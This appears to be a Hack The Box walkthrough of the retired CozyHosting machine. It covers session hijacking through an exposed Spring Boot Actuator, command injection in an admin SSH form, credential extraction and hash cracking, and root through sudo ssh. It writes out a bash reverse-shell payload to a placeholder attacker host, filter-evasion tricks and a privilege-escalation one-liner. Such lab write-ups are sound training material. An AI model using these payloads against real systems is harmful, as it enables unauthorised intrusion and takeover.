---
machine: CozyHosting
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Spring Boot
state: Retired
tags: [spring-boot, actuator, session-hijack, command-injection, postgres, gtfobins]
---

# CozyHosting — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

A **Spring Boot** app behind nginx. The **Actuator** is exposed without authentication: `/actuator/sessions` leaks live `JSESSIONID`s and allows **session hijacking** of `kanderson`. In the admin panel the SSH connection form has **command injection** in the username. The `.jar` hands over **PostgreSQL** credentials with hashes → `josh` → `sudo ssh` (GTFOBins).

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh   OpenSSH 8.9p1
80/tcp open  http  nginx 1.18.0 (proxy to Spring Boot)
```

`/error` returns Spring's JSON and `/actuator` lists `health, beans, env, sessions, mappings`.

## Access

```bash
curl -s http://cozyhosting.htb/actuator/sessions
# {"kanderson":"<JSESSIONID>"}
```

With that cookie `/admin` opens, where the "Automatic SSH connection" form feeds `username` and `host` into `Runtime.exec` unsanitised:

```text
username=;bash${IFS}-c${IFS}'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
```

`host` is regex-validated, the username is not: that is the flaw. The field **rejects spaces**, so rebuild them with `${IFS}` or send the command base64-encoded (`echo <b64>|base64 -d|bash`). Shell as the app user.

## Escalation

```bash
unzip -p /app/cloudhosting-0.0.1.jar BOOT-INF/classes/application.properties
```

```text
spring.datasource.username=postgres
spring.datasource.password=<password>
```

```bash
psql -h 127.0.0.1 -U postgres -c 'select * from users;'
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
ssh josh@<IP>
```

```bash
sudo -l
# (root) /usr/bin/ssh *
```

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

## Pitfalls

- **Session cookie**: without an admin session, `/admin` redirects to login.
- **Spaces in the payload**: the field mangles them; base64-encode (`echo <b64>|base64 -d|bash`).
- **`sudo ssh`**: without `-o ProxyCommand` the escalation fails; it is the classic GTFOBins example.

## Lessons

- An exposed Actuator publishes sessions, environment variables and beans: an admin panel without a password.
- Validating one field and forgetting its neighbour is a recurring pattern.
- Credentials in `application.properties` inside the `.jar` sit in clear text.
- `sudo` on `ssh` equals root.
